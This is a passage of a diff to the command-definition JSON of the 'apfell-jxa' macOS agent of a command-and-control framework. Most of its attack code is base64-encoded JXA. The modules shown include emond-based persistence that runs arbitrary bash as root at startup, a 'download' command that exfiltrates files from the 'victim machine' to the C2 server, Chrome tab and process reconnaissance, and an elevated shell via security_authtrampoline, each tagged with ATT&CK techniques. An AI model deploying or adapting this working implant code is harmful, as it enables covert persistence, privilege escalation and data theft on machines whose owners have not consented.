GNvbW1hbmRfZGF0YSA9ICQoY29tbWFuZCkuZGF0YVVzaW5nRW5jb2RpbmcoJC5OU0RhdGEuTlNVVEYxNlN0cmluZ0VuY29kaW5nKTsKICAgICAgICAgICAgdmFyIGJhc2U2NF9jb21tYW5kID0gY29tbWFuZF9kYXRhLmJhc2U2NEVuY29kZWRTdHJpbmdXaXRoT3B0aW9ucygwKS5qczsKICAgICAgICAgICAgdmFyIGZ1bGxfY29tbWFuZCA9ICJlY2hvIFwiIiArIGJhc2U2NF9jb21tYW5kICsgIlwiIHwgYmFzZTY0IC1EIHwgL3Vzci9iaW4vb3Nhc2NyaXB0IC1sIEphdmFTY3JpcHQgJmFtcDsiOwogICAgICAgIH0KICAgICAgICBlbHNlIGlmKHBheWxvYWRfdHlwZSA9PT0gImN1c3RvbV9iYXNoLWMiKXsKICAgICAgICAgICAgaWYoY29uZmlnLmhhc093blByb3BlcnR5KCdjb21tYW5kJykgJiYgY29uZmlnWydjb21tYW5kJ10gIT09ICIiKXt2YXIgZnVsbF9jb21tYW5kID0gY29uZmlnWydjb21tYW5kJ107fQogICAgICAgICAgICBlbHNlewogICAgICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6ImNvbW1hbmQgaXMgYSByZXF1aXJlZCBmaWVsZCBmb3IgdGhlIGN1c3RvbV9iYXNoLWMgcGF5bG9hZF90eXBlIiwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAvLyBnZXQgb3VyIG5ldyBwbGlzdCBmaWxlX25hbWUKICAgICAgICBpZihjb25maWcuaGFzT3duUHJvcGVydHkoJ2ZpbGVfbmFtZScpICYmIGNvbmZpZ1snZmlsZV9uYW1lJ10gIT09ICIiKXsgdmFyIGZpbGVfbmFtZSA9IGNvbmZpZ1snZmlsZV9uYW1lJ107fQogICAgICAgIGVsc2V7IHJldHVybiB7InVzZXJfb3V0cHV0IjoiZmlsZSBuYW1lIGlzIHJlcXVpcmVkIiwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsgfQoKICAgICAgICB2YXIgcGxpc3RfY29udGVudHMgPSAiPD94bWwgdmVyc2lvbj1cIjEuMFwiIGVuY29kaW5nPVwiVVRGLThcIj8+XG4iICsKICAgICI8IURPQ1RZUEUgcGxpc3QgUFVCTElDIFwiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOXCIgXCJodHRwOi8vd3d3LmFwcGxlLmNvbS9EVERzL1Byb3BlcnR5TGlzdC0xLjAuZHRkXCI+XG4iICsKICAgICI8cGxpc3QgdmVyc2lvbj1cIjEuMFwiPlxuIiArCiAgICAiPGFycmF5PlxuIiArCiAgICAiCTxkaWN0PlxuIiArCiAgICAiCQk8a2V5Pm5hbWU8L2tleT5cbiIgKwogICAgIgkJPHN0cmluZz4iICsgcnVsZV9uYW1lICsgIjwvc3RyaW5nPlxuIiArCiAgICAiCQk8a2V5PmVuYWJsZWQ8L2tleT5cbiIgKwogICAgIgkJPHRydWUvPlxuIiArCiAgICAiCQk8a2V5PmV2ZW50VHlwZXM8L2tleT5cbiIgKwogICAgIgkJPGFycmF5PlxuIiArCiAgICAiCQkJPHN0cmluZz5zdGFydHVwPC9zdHJpbmc+XG4iICsKICAgICIJCTwvYXJyYXk+XG4iICsKICAgICIJCTxrZXk+YWN0aW9uczwva2V5PlxuIiArCiAgICAiCQk8YXJyYXk+XG4iICsKICAgICIJCQk8ZGljdD5cbiIgKwogICAgIgkJCQk8a2V5PmNvbW1hbmQ8L2tleT5cbiIgKwogICAgIgkJCQk8c3RyaW5nPi9iaW4vc2xlZXA8L3N0cmluZz5cbiIgKwogICAgIgkJCQk8a2V5PnVzZXI8L2tleT5cbiIgKwogICAgIgkJCQk8c3RyaW5nPnJvb3Q8L3N0cmluZz5cbiIgKwogICAgIgkJCQk8a2V5PmFyZ3VtZW50czwva2V5PlxuIiArCiAgICAiCQkJCTxhcnJheT5cbiIgKwogICAgIgkJCQkJPHN0cmluZz42MDwvc3RyaW5nPlxuIiArCiAgICAiCQkJCTwvYXJyYXk+XG4iICsKICAgICIJCQkJPGtleT50eXBlPC9rZXk+XG4iICsKICAgICIJCQkJPHN0cmluZz5SdW5Db21tYW5kPC9zdHJpbmc+XG4iICsKICAgICIJCQk8L2RpY3Q+XG4iICsKICAgICIJCQk8ZGljdD5cbiIgKwogICAgIgkJCQk8a2V5PmNvbW1hbmQ8L2tleT5cbiIgKwogICAgIgkJCQk8c3RyaW5nPi9iaW4vYmFzaDwvc3RyaW5nPlxuIiArCiAgICAiCQkJCTxrZXk+dXNlcjwva2V5PlxuIiArCiAgICAiCQkJCTxzdHJpbmc+cm9vdDwvc3RyaW5nPlxuIiArCiAgICAiCQkJCTxrZXk+YXJndW1lbnRzPC9rZXk+XG4iICsKICAgICIJCQkJPGFycmF5PlxuIiArCiAgICAiCQkJCQk8c3RyaW5nPi1jPC9zdHJpbmc+XG4iICsKICAgICIJCQkJCTxzdHJpbmc+ICIgKyBmdWxsX2NvbW1hbmQgKyAiPC9zdHJpbmc+XG4iICsKICAgICIJCQkJPC9hcnJheT5cbiIgKwogICAgIgkJCQk8a2V5PnR5cGU8L2tleT5cbiIgKwogICAgIgkJCQk8c3RyaW5nPlJ1bkNvbW1hbmQ8L3N0cmluZz5cbiIgKwogICAgIgkJCTwvZGljdD5cbiIgKwogICAgIgkJPC9hcnJheT5cbiIgKwogICAgIgk8L2RpY3Q+XG4iICsKICAgICI8L2FycmF5PlxuIiArCiAgICAiPC9wbGlzdD4iOwogICAgICAgIC8vIHJlYWQgdGhlIHBsaXN0IGZpbGUgYW5kIGNoZWNrIHRoZSBRdWV1ZURpcmVjdG9yaWVzIGZpZWxkCiAgICAgICAgdmFyIHByZWZzID0gT2JqQy5kZWVwVW53cmFwKCQuTlNNdXRhYmxlRGljdGlvbmFyeS5hbGxvYy5pbml0V2l0aENvbnRlbnRzT2ZGaWxlKCQoIi9TeXN0ZW0vTGlicmFyeS9MYXVuY2hEYWVtb25zL2NvbS5hcHBsZS5lbW9uZC5wbGlzdCIpKSk7CiAgICAgICAgLy9jb25zb2xlLmxvZyhKU09OLnN0cmluZ2lmeShwcmVmcykpOwogICAgICAgIHZhciBxdWV1ZURpcmVjdG9yaWVzID0gcHJlZnNbJ1F1ZXVlRGlyZWN0b3JpZXMnXTsKICAgICAgICBpZihxdWV1ZURpcmVjdG9yaWVzICE9PSB1bmRlZmluZWQgJiYgcXVldWVEaXJlY3Rvcmllcy5sZW5ndGggPiAwKXsKICAgICAgICAgICAgdmFyIHF1ZXVlRGlyZWN0b3J5UGF0aCA9IHF1ZXVlRGlyZWN0b3JpZXNbMF07CiAgICAgICAgICAgIHdyaXRlX2RhdGFfdG9fZmlsZSgiICIsIHF1ZXVlRGlyZWN0b3J5UGF0aCArICIvLkRTX1N0b3JlIik7CiAgICAgICAgICAgIC8vIG5vdyB0aGF0IHdlIGhhdmUgYSBmaWxlIGluIG91ciBxdWV1ZURpcmVjdG9yeSwgd2UgbmVlZCB0byB3cml0ZSBvdXQgb3VyIHBsaXN0CiAgICAgICAgICAgIHdyaXRlX2RhdGFfdG9fZmlsZShwbGlzdF9jb250ZW50cywgIi9ldGMvZW1vbmQuZC9ydWxlcy8iICsgZmlsZV9uYW1lKTsKCiAgICAgICAgICAgIHZhciB1c2VyX291dHB1dCA9ICJDcmVhdGVkICIgKyBxdWV1ZURpcmVjdG9yeVBhdGggKyAiLy5EU19TdG9yZSBhbmQgL2V0Yy9lbW9uZC5kL3J1bGVzLyIgKyBmaWxlX25hbWUgKyAiIHdpdGggY29udGVudHM6IFxuIiArIHBsaXN0X2NvbnRlbnRzOwoKICAgICAgICAgICAgLy8gYW5ub3VuY2Ugb3VyIGNyZWF0ZWQgYXJ0aWZhY3RzIGFuZCB1c2VyIG91dHB1dAogICAgICAgICAgICBsZXQgYXJ0aWZhY3RzID0geyd1c2VyX291dHB1dCc6IHVzZXJfb3V0cHV0LCAnYXJ0aWZhY3RzJzogW3snYmFzZV9hcnRpZmFjdCc6ICdGaWxlIENyZWF0ZScsICdhcnRpZmFjdCc6IHF1ZXVlRGlyZWN0b3J5UGF0aCArICIvLkRTX1N0b3JlIn0sIHsnYmFzZV9hcnRpZmFjdCc6ICdGaWxlIENyZWF0ZScsICdhcnRpZmFjdCc6ICcvZXRjL2Vtb25kLmQvcnVsZXMvJyArIGZpbGVfbmFtZX1dLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgICAgIHJldHVybiBhcnRpZmFjdHMKICAgICAgICB9CiAgICAgICAgZWxzZXsKICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiJRdWV1ZURpcmVjdG9yaWVzIGFycmF5IGlzIGVpdGhlciBub3QgdGhlcmUgb3IgMCBpbiBsZW5ndGgiLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgICAgIH0KICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOmVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICB9Cn07CkNPTU1BTkRfRU5EU19IRVJF"
+            }
+          ],
+          "transforms": []
+        },
+        {
+          "needs_admin": false,
           "help_cmd": "shell_elevated",
           "version": 1,
           "is_exit": false,
@@ -1121,24 +1465,10 @@
           "parameters": [
             {
               "type": "String",
-              "hint": "What prompt to display to the user when asking for permission",
+              "hint": "Command to execute",
               "choices": "",
-              "required": false,
-              "name": "prompt"
-            },
-            {
-              "type": "Credential",
-              "hint": "The user's password",
-              "choices": "",
-              "required": false,
-              "name": "credential"
-            },
-            {
-              "type": "Credential",
-              "hint": "Username that you want to run as",
-              "choices": "",
-              "required": false,
-              "name": "user"
+              "required": true,
+              "name": "command"
             },
             {
               "type": "Boolean",
@@ -1148,11 +1478,25 @@
               "name": "use_creds"
             },
             {
-              "type": "String",
-              "hint": "Command to execute",
+              "type": "Credential",
+              "hint": "Username that you want to run as",
               "choices": "",
-              "required": true,
-              "name": "command"
+              "required": false,
+              "name": "user"
+            },
+            {
+              "type": "Credential",
+              "hint": "The user's password",
+              "choices": "",
+              "required": false,
+              "name": "credential"
+            },
+            {
+              "type": "String",
+              "hint": "What prompt to display to the user when asking for permission",
+              "choices": "",
+              "required": false,
+              "name": "prompt"
             }
           ],
           "attack": [
@@ -1173,19 +1517,7 @@
             {
               "command_parameter": "command",
               "artifact": "Process Create",
-              "artifact_string": "*",
-              "replace_string": "*"
-            },
-            {
-              "command_parameter": "command",
-              "artifact": "Process Create",
-              "artifact_string": "\/usr\/libexec\/security_authtrampoline \/System\/Library\/ScriptingAdditions\/StandardAdditions.osax\/Contents\/MacOS\/uid auth 15 \/System\/Library\/ScriptingAdditions\/StandardAdditions.osax\/Contents\/MacOS\/uid \/bin\/sh -c *",
-              "replace_string": "*"
-            },
-            {
-              "command_parameter": "command",
-              "artifact": "Process Create",
-              "artifact_string": "\/bin\/sh -c *",
+              "artifact_string": "\/System\/Library\/ScriptingAdditions\/StandardAdditions.osax\/Contents\/MacOS\/uid \/bin\/sh -c *",
               "replace_string": "*"
             },
             {
@@ -1197,7 +1529,19 @@
             {
               "command_parameter": "command",
               "artifact": "Process Create",
-              "artifact_string": "\/System\/Library\/ScriptingAdditions\/StandardAdditions.osax\/Contents\/MacOS\/uid \/bin\/sh -c *",
+              "artifact_string": "\/bin\/sh -c *",
+              "replace_string": "*"
+            },
+            {
+              "command_parameter": "command",
+              "artifact": "Process Create",
+              "artifact_string": "\/usr\/libexec\/security_authtrampoline \/System\/Library\/ScriptingAdditions\/StandardAdditions.osax\/Contents\/MacOS\/uid auth 15 \/System\/Library\/ScriptingAdditions\/StandardAdditions.osax\/Contents\/MacOS\/uid \/bin\/sh -c *",
+              "replace_string": "*"
+            },
+            {
+              "command_parameter": "command",
+              "artifact": "Process Create",
+              "artifact_string": "*",
               "replace_string": "*"
             }
           ],
@@ -1257,9 +1601,9 @@
               "parameter": "level",
               "active": true,
               "description": "",
-              "timestamp": "03\/20\/2020 01:02:00",
+              "timestamp": "05\/07\/2020 07:01:49",
               "command": "terminals_read",
-              "command_id": 42,
+              "command_id": 43,
               "payload_type": "apfell-jxa",
               "transform": "jsonSingleParameter",
               "parameter_type": "String"
@@ -1307,48 +1651,6 @@
             }
           ],
           "transforms": []
-        },
-        {
-          "needs_admin": false,
-          "help_cmd": "download {path to remote file}",
-          "version": 6,
-          "is_exit": false,
-          "is_file_browse": false,
-          "file_browse_parameters": "",
-          "is_process_list": false,
-          "process_list_parameters": "",
-          "is_download_file": false,
-          "download_file_parameters": "",
-          "is_remove_file": false,
-          "remove_file_parameters": "",
-          "is_agent_generator": false,
-          "author": "",
-          "deleted": false,
-          "description": "Download a file from the victim machine to the apfell server in chunks (no need for quotes in the path). It will be saved to app\/files\/{operation name}\/downloads\/{hostname}\/{filename}",
-          "cmd": "download",
-          "parameters": [],
-          "attack": [
-            {
-              "t_num": "T1020",
-              "attack_name": "Automated Exfiltration"
-            },
-            {
-              "t_num": "T1030",
-              "attack_name": "Data Transfer Size Limits"
-            },
-            {
-              "t_num": "T1041",
-              "attack_name": "Exfiltration Over Command and Control Channel"
-            }
-          ],
-          "artifacts": [],
-          "files": [
-            {
-              "download.js": "ZXhwb3J0cy5kb3dubG9hZCA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICB0cnl7CiAgICAJaWYocGFyYW1zID09PSAiIiB8fCBwYXJhbXMgPT09IHVuZGVmaW5lZCl7cmV0dXJuIHsndXNlcl9vdXRwdXQnOiAiTXVzdCBzdXBwbHkgYSBwYXRoIHRvIGEgZmlsZSB0byBkb3dubG9hZCIsICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07IH0KICAgICAgICByZXR1cm4gQzIuZG93bmxvYWQodGFzaywgcGFyYW1zKTsKICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsndXNlcl9vdXRwdXQnOiBlcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgfQoKfTsKQ09NTUFORF9FTkRTX0hFUkU="
-            }
-          ],
-          "transforms": [],
-          "browser_script": "ZnVuY3Rpb24odGFzaywgcmVzcG9uc2VzKXsKICBpZih0YXNrLmNvbXBsZXRlZCA9PT0gdHJ1ZSAmJiB0YXNrLnN0YXR1cyAhPT0gJ2Vycm9yJyl7CiAgICB0cnl7CiAgICAgICAgbGV0IHN0YXR1cyA9IEpTT04ucGFyc2UocmVzcG9uc2VzWzBdWydyZXNwb25zZSddKTsKICAgICAgICBpZihzdGF0dXMuaGFzT3duUHJvcGVydHkoJ2FnZW50X2ZpbGVfaWQnKSl7CiAgICAgICAgCWxldCBmaWxlX25hbWUgPSB0YXNrWydwYXJhbXMnXTsKCQkgICAgICBsZXQgb3V0cHV0ID0gIjxkaXYgY2xhc3M9J2NhcmQnPjxkaXYgY2xhc3M9J2NhcmQtaGVhZGVyIGJvcmRlciBib3JkZXItZGFyayBzaGFkb3cnPkZpbmlzaGVkIERvd25sb2FkaW5nIDxzcGFuIGNsYXNzPSdkaXNwbGF5Jz4iICsgZmlsZV9uYW1lICsgIjwvc3Bhbj4uIENsaWNrIDxhIGhyZWY9Jy9hcGkvdjEuNC9maWxlcy9kb3dubG9hZC8iICsgc3RhdHVzWydhZ2VudF9maWxlX2lkJ10gKyAiJz5oZXJlPC9hPiB0byBkb3dubG9hZDwvZGl2PjwvZGl2PiI7CgkJICAgICAgcmV0dXJuIG91dHB1dDsKCSAgICAJfQogICAgfWNhdGNoKGVycm9yKXsKICAgICAgIHJldHVybiAiPHByZT5FcnJvcjogIiArIGVycm9yLnRvU3RyaW5nKCkgKyAiXG4iICsgSlNPTi5zdHJpbmdpZnkocmVzcG9uc2VzLCBudWxsLCAyKSArICI8L3ByZT4iOwogICAgfQogIH0KICBpZih0YXNrLnN0YXR1cyA9PT0gJ2Vycm9yJyl7CiAgCXJldHVybiAiPHByZT4gRXJyb3I6IHVudG9nZ2xlIGZvciBlcnJvciBtZXNzYWdlKHMpIDwvcHJlPiI7CiAgfQogIHJldHVybiAiPHByZT4gRG93bmxvYWRpbmcuLi4gPC9wcmU+IjsKfQ=="
         },
         {
           "needs_admin": false,
@@ -1439,11 +1741,11 @@
           "cmd": "terminals_send",
           "parameters": [
             {
-              "type": "String",
-              "hint": "command to execute",
+              "type": "Number",
+              "hint": "",
               "choices": "",
-              "required": false,
-              "name": "command"
+              "required": true,
+              "name": "window"
             },
             {
               "type": "Number",
@@ -1453,11 +1755,11 @@
               "name": "tab"
             },
             {
-              "type": "Number",
-              "hint": "",
+              "type": "String",
+              "hint": "command to execute",
               "choices": "",
-              "required": true,
-              "name": "window"
+              "required": false,
+              "name": "command"
             }
           ],
           "attack": [
@@ -1487,73 +1789,6 @@
         },
         {
           "needs_admin": false,
-          "help_cmd": "chrome_tabs",
-          "version": 1,
-          "is_exit": false,
-          "is_file_browse": false,
-          "file_browse_parameters": "",
-          "is_process_list": false,
-          "process_list_parameters": "",
-          "is_download_file": false,
-          "download_file_parameters": "",
-          "is_remove_file": false,
-          "remove_file_parameters": "",
-          "is_agent_generator": false,
-          "author": "",
-          "deleted": false,
-          "description": "This uses JXA to list information about all of the open tabs in all of the open Chrome instances. If Chrome is not currently running, this will launch Chrome (potential OPSEC issue) and might have a conflict with trying to access Chrome tabs as Chrome is starting. It's recommended to not use this unless Chrome is already running. Use the list_apps function to check if Chrome is running.\nIn Mojave this will cause a popup the first time asking for permission for your process to access Chrome.",
-          "cmd": "chrome_tabs",
-          "parameters": [],
-          "attack": [
-            {
-              "t_num": "T1010",
-              "attack_name": "Application Window Discovery"
-            }
-          ],
-          "artifacts": [],
-          "files": [
-            {
-              "chrome_tabs.js": "ZXhwb3J0cy5jaHJvbWVfdGFicyA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CglsZXQgdGFicyA9IHt9OwoJdHJ5ewoJCWxldCBjaCA9IEFwcGxpY2F0aW9uKCJHb29nbGUgQ2hyb21lIik7CgkJaWYoY2gucnVubmluZygpKXsKICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBjaC53aW5kb3dzLmxlbmd0aDsgaSsrKXsKICAgICAgICAgICAgICAgIGxldCB3aW4gPSBjaC53aW5kb3dzW2ldOwogICAgICAgICAgICAgICAgdGFic1siV2luZG93ICIgKyBpXSA9IHt9OwogICAgICAgICAgICAgICAgZm9yIChsZXQgaiA9IDA7IGogPCB3aW4udGFicy5sZW5ndGg7IGorKyl7CiAgICAgICAgICAgICAgICAgICAgbGV0IHRhYiA9IHdpbi50YWJzW2pdOwogICAgICAgICAgICAgICAgICAgIHRhYnNbIldpbmRvdyAiICsgaV1bIlRhYiAiICsgal0gPSB7InRpdGxlIjogdGFiLnRpdGxlKCksICJ1cmwiOiB0YWIudXJsKCl9OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjogIkNocm9tZSBpcyBub3QgcnVubmluZyIsICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICAgICAgfQoJfWNhdGNoKGVycm9yKXsKCQlsZXQgZXJyID0gZXJyb3IudG9TdHJpbmcoKTsKCQlpZihlcnIgPT09ICJFcnJvcjogQW4gZXJyb3Igb2NjdXJyZWQuIil7CgkJICAgIGVyciArPSAiIEFwZmVsbCB3YXMgZGVuaWVkIGFjY2VzcyB0byBHb29nbGUgQ2hyb21lIChlaXRoZXIgYnkgcG9wdXAgb3IgcHJpb3IgZGVueSkuIjsKCQl9CgkJcmV0dXJuIHsidXNlcl9vdXRwdXQiOmVyciwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKCX0KCXJldHVybiB7InVzZXJfb3V0cHV0IjogSlNPTi5zdHJpbmdpZnkodGFicywgbnVsbCwgMiksICJjb21wbGV0ZWQiOiB0cnVlfTsKfTsKQ09NTUFORF9FTkRTX0hFUkU="
-            }
-          ],
-          "transforms": []
-        },
-        {
-          "needs_admin": false,
-          "help_cmd": "list_apps",
-          "version": 1,
-          "is_exit": false,
-          "is_file_browse": false,
-          "file_browse_parameters": "",
-          "is_process_list": true,
-          "process_list_parameters": "",
-          "is_download_file": false,
-          "download_file_parameters": "",
-          "is_remove_file": false,
-          "remove_file_parameters": "",
-          "is_agent_generator": false,
-          "author": "",
-          "deleted": false,
-          "description": "This uses NSApplication.RunningApplications api to get information about running applications.",
-          "cmd": "list_apps",
-          "parameters": [],
-          "attack": [
-            {
-              "t_num": "T1057",
-              "attack_name": "Process Discovery"
-            }
-          ],
-          "artifacts": [],
-          "files": [
-            {
-              "list_apps.js": "ZXhwb3J0cy5saXN0X2FwcHMgPSBmdW5jdGlvbih0YXNrLCBjb21tYW5kLCBwYXJhbXMpewogICAgT2JqQy5pbXBvcnQoJ0FwcEtpdCcpOwogICAgdHJ5ewogICAgICAgIGxldCBuYW1lcyA9IFtdOwogICAgICAgIGxldCBwcm9jcyA9ICQuTlNXb3Jrc3BhY2Uuc2hhcmVkV29ya3NwYWNlLnJ1bm5pbmdBcHBsaWNhdGlvbnMuanM7CiAgICAgICAgZm9yKGxldCBpID0gMDsgaSA8IHByb2NzLmxlbmd0aDsgaSsrKXsKICAgICAgICAgICAgbGV0IGluZm8gPSB7fTsKICAgICAgICAgICAgaW5mb1snZnJvbnRNb3N0J10gPSBwcm9jc1tpXS5hY3RpdmU7CiAgICAgICAgICAgIGluZm9bJ2hpZGRlbiddID0gcHJvY3NbaV0uaGlkZGVuOwogICAgICAgICAgICBpbmZvWydidW5kbGUnXSA9IHByb2NzW2ldLmJ1bmRsZUlkZW50aWZpZXIuanM7CiAgICAgICAgICAgIGluZm9bJ2J1bmRsZVVSTCddID0gcHJvY3NbaV0uYnVuZGxlVVJMLnBhdGguanM7CiAgICAgICAgICAgIGluZm9bJ2Jpbl9wYXRoJ10gPSBwcm9jc1tpXS5leGVjdXRhYmxlVVJMLnBhdGguanM7CiAgICAgICAgICAgIGluZm9bJ3Byb2Nlc3NfaWQnXSA9IHByb2NzW2ldLnByb2Nlc3NJZGVudGlmaWVyOwogICAgICAgICAgICBpbmZvWyduYW1lJ10gPSBwcm9jc1tpXS5sb2NhbGl6ZWROYW1lLmpzOwogICAgICAgICAgICBpZihwcm9jc1tpXS5leGVjdXRhYmxlQXJjaGl0ZWN0dXJlID09PSAiMTY3NzcyMjMiKXsKICAgICAgICAgICAgICAgIGluZm9bJ2FyY2hpdGVjdHVyZSddID0gIng2NCI7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSBpZihwcm9jc1tpXS5leGVjdXRhYmxlQXJjaGl0ZWN0dXJlID09PSAiNyIpewogICAgICAgICAgICAgICAgaW5mb1snYXJjaGl0ZWN0dXJlJ10gPSAieDg2IjsKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIGlmKHByb2NzW2ldLmV4ZWN1dGFibGVBcmNoaXRlY3R1cmUgPT09ICIxOCIpewogICAgICAgICAgICAgICAgaW5mb1snYXJjaGl0ZWN0dXJlJ10gPSAieDg2X1BQQyI7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSBpZihwcm9jc1tpXS5leGVjdXRhYmxlQXJjaGl0ZWN0dXJlID09PSAiMTY3NzcyMzQiKXsKICAgICAgICAgICAgICAgIGluZm9bJ2FyY2hpdGVjdHVyZSddID0gIng4Nl82NF9QUEMiOwogICAgICAgICAgICB9CiAgICAgICAgICAgIG5hbWVzLnB1c2goaW5mbyk7CiAgICAgICAgfQogICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjpKU09OLnN0cmluZ2lmeShuYW1lcywgbnVsbCwgMiksICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOmVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICB9Cn07CkNPTU1BTkRfRU5EU19IRVJF"
-            }
-          ],
-          "transforms": [],
-          "browser_script": "ZnVuY3Rpb24odGFzaywgcmVzcG9uc2UpewoJaWYodGFzay5zdGF0dXMgPT09ICdlcnJvcicpewoJCXJldHVybiAiPHByZT4gRXJyb3I6IHVudG9nZ2xlIGZvciBlcnJvciBtZXNzYWdlKHMpIDwvcHJlPiI7Cgl9CiAgbGV0IHJvd3MgPSBbXTsKICBmb3IobGV0IGkgPSAwOyBpIDwgcmVzcG9uc2UubGVuZ3RoOyBpKyspewogICAgdHJ5ewogICAgICAgIGxldCBkYXRhID0gSlNPTi5wYXJzZShyZXNwb25zZVtpXVsncmVzcG9uc2UnXSk7CiAgICAgICAgbGV0IHJvd19zdHlsZSA9ICIiOwogIAkJCWxldCBjZWxsX3N0eWxlID0ge307CgkJICAgIE9iamVjdC5rZXlzKGRhdGEpLmZvckVhY2goZnVuY3Rpb24oeCl7CgkJICAgICAgdmFyIHIgPSBkYXRhW3hdOwoJCSAgICAgIHZhciByb3dfc3R5bGUgPSAiIjsKCQkgICAgICBpZihyWyduYW1lJ10uaW5jbHVkZXMoIjFQYXNzd29yZCIpKXtyb3dfc3R5bGU9ImJhY2tncm91bmQtY29sb3I6Z3JlZW47Y29sb3I6d2hpdGUifQoJCSAgICAgIGlmKHJbJ25hbWUnXS5pbmNsdWRlcygiVGVybSIpKXtyb3dfc3R5bGU9ImJhY2tncm91bmQtY29sb3I6cmVkO2NvbG9yOndoaXRlIn0KCQkgICAgICBpZihyWyduYW1lJ10uaW5jbHVkZXMoIlNuaXRjaCIpKXtyb3dfc3R5bGU9ImJhY2tncm91bmQtY29sb3I6cmVkO2NvbG9yOndoaXRlIn0KCQkgICAgICByb3dzLnB1c2goeyJwaWQiOiByWydwcm9jZXNzX2lkJ10sCgkJICAgICAgICAgICAgICAgICAibmFtZSI6IHJbJ25hbWUnXSwKCQkgICAgICAgICAgICAgICAgICJhcmNoIjogclsnYXJjaGl0ZWN0dXJlJ10sCgkJICAgICAgICAgICAgICAgICAiZnJvbnRNb3N0IjogclsnZnJvbnRNb3N0J10sCgkJICAgICAgICAgICAgICAgICAiYmluX3BhdGgiOiByWydiaW5fcGF0aCddLAoJCSAgICAgICAgICAgICAgICAgInJvdy1zdHlsZSI6IHJvd19zdHlsZSwKCQkgICAgICAgICAgICAgICAgICJjZWxsLXN0eWxlIjogeyJoaWRkZW4iOiAidGV4dC1hbGlnbjpjZW50ZXIiLAoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInBpZCI6InRleHQtYWxpZ246Y2VudGVyIn0KCQkgICAgICAgICAgICAgICAgIH0pOwoJCSAgICB9KTsKICAgIH0KICAgIGNhdGNoKGVycm9yKXsKICAgICAgICAiPHByZT5FcnJvcjogIiArIGVycm9yLnRvU3RyaW5nKCkgKyAiXG4iICsgSlNPTi5zdHJpbmdpZnkocmVzcG9uc2UsIG51bGwsIDIpICsgIjwvcHJlPiI7CiAgICB9CiAgfQogIGxldCBvdXRwdXQgPSBzdXBwb3J0X3NjcmlwdHNbJ2NyZWF0ZV90YWJsZSddKFt7Im5hbWUiOiJwaWQiLCJzaXplIjoiMmVtIn0seyJuYW1lIjoiYXJjaCIsInNpemUiOiIyZW0ifSx7Im5hbWUiOiJuYW1lIiwgInNpemUiOiIxMGVtIn0sIHsibmFtZSI6ImZyb250TW9zdCIsInNpemUiOiIzZW0ifSx7Im5hbWUiOiJiaW5fcGF0aCIsInNpemUiOiIyMGVtIn1dLCByb3dzKTsKICByZXR1cm4gb3V0cHV0Owp9"
-        },
-        {
-          "needs_admin": false,
           "help_cmd": "persist_launch",
           "version": 1,
           "is_exit": false,
@@ -1572,32 +1807,11 @@
           "cmd": "persist_launch",
           "parameters": [
             {
-              "type": "Boolean",
+              "type": "Array",
               "hint": "",
-              "choices": "",
-              "required": false,
-              "name": "RunAtLoad"
-            },
-            {
-              "type": "Boolean",
-              "hint": "",
-              "choices": "",
-              "required": false,
-              "name": "LocalAgent"
-            },
-            {
-              "type": "String",
-              "hint": "Path to save new plist to if LocalAgent is false",
-              "choices": "",
-              "required": false,
-              "name": "LaunchPath"
-            },
-            {
-              "type": "String",
-              "hint": "com.apple.softwareupdateagent",
               "choices": "",
               "required": true,
-              "name": "label"
+              "name": "args"
             },
             {
               "type": "Boolean",
@@ -1607,11 +1821,32 @@
               "name": "KeepAlive"
             },
             {
-              "type": "Array",
-              "hint": "",
+              "type": "String",
+              "hint": "com.apple.softwareupdateagent",
               "choices": "",
               "required": true,
-              "name": "args"
+              "name": "label"
+            },
+            {
+              "type": "String",
+              "hint": "Path to save new plist to if LocalAgent is false",
+              "choices": "",
+              "required": false,
+              "name": "LaunchPath"
+            },
+            {
+              "type": "Boolean",
+              "hint": "",
+              "choices": "",
+              "required": false,
+              "name": "LocalAgent"
+            },
+            {
+              "type": "Boolean",
+              "hint": "",
+              "choices": "",
+              "required": false,
+              "name": "RunAtLoad"
             }
           ],
           "attack": [
@@ -1626,15 +1861,15 @@
           ],
           "artifacts": [
             {
-              "command_parameter": "LaunchPath",
-              "artifact": "File Create",
-              "artifact_string": "Potentially created \"*\" if we didn't create a launch agent file.",
